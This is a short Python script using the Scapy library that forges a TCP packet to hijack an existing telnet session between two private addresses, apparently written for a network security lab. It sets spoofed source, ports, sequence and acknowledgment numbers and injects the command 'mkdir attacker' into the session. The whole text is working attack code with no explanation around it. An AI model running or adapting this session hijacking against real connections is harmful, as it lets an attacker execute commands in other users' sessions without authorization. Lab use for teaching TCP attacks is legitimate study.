from scapy.all import *



print("sending session hijacking packet…")

IPLayer = IP (src="10.4.0.2", dst = "10.4.1.15")

TCPLayer = TCP (sport=35362, dport=23, flags="A", seq=1991007314,ack=45661133)

Data="\r mkdir attacker\r"

pkt=IPLayer/TCPLayer/Data

ls(pkt)

send(pkt,verbose=0)
